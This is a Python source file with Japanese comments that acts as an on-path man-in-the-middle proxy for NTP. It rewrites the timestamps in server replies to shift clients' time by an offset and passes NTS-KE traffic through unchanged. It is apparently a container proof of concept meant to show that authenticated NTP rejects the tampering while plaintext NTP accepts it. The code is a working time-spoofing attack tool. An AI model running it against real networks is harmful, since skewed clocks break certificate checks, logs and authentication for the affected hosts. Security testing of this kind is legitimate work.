"""経路上の攻撃者。NTP 応答の受信時刻と送信時刻に offset 秒を足し、NTS-KE (TCP) は素通しする。

ヘッダーだけを書き換え、NTS の拡張フィールドや対称鍵の MAC には触れない。
認証付きの NTP なら MAC や AEAD の検証で弾かれ、平文の NTP なら時刻がずれたまま受理されるはず。
"""
import argparse
import asyncio
import struct


def tamper(data: bytes, offset: int) -> bytes:
    if len(data) < 48:
        return data
    b = bytearray(data)
    for pos in (32, 40):  # receive timestamp, transmit timestamp の秒フィールド
        sec = struct.unpack_from("!I", b, pos)[0]
        struct.pack_into("!I", b, pos, (sec + offset) & 0xFFFFFFFF)
    return bytes(b)


class UpstreamProto(asyncio.DatagramProtocol):
    def __init__(self, server, client_addr):
        self.server, self.client_addr = server, client_addr

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        out = tamper(data, self.server.offset)
        print(f"udp reply to {self.client_addr[0]} tampered +{self.server.offset}s len={len(data)}", flush=True)
        self.server.transport.sendto(out, self.client_addr)


class FrontProto(asyncio.DatagramProtocol):
    def __init__(self, upstream, offset):
        self.upstream, self.offset, self.peers = upstream, offset, {}

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        asyncio.ensure_future(self._forward(data, addr))

    async def _forward(self, data, addr):
        if addr not in self.peers:
            loop = asyncio.get_running_loop()
            t, _ = await loop.create_datagram_endpoint(
                lambda: UpstreamProto(self, addr), remote_addr=(self.upstream, 123))
            self.peers[addr] = t
        self.peers[addr].sendto(data)


async def pipe(r, w):
    try:
        while data := await r.read(65536):
            w.write(data)
            await w.drain()
    finally:
        w.close()


async def tcp_passthrough(upstream, port):
    async def handle(cr, cw):
        ur, uw = await asyncio.open_connection(upstream, port)
        print(f"tcp {port} passthrough", flush=True)
        await asyncio.gather(pipe(cr, uw), pipe(ur, cw))
    return await asyncio.start_server(handle, "0.0.0.0", port)


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--upstream", required=True)
    ap.add_argument("--offset", type=int, default=3600)
    a = ap.parse_args()
    loop = asyncio.get_running_loop()
    # コンテナ内 bind。compose ではポートを公開しないので poc ネットワーク内からしか届かない
    await loop.create_datagram_endpoint(lambda: FrontProto(a.upstream, a.offset), local_addr=("0.0.0.0", 123))
    srv = await tcp_passthrough(a.upstream, 4460)
    print(f"mitm ready upstream={a.upstream} offset=+{a.offset}s", flush=True)
    await srv.serve_forever()


asyncio.run(main())
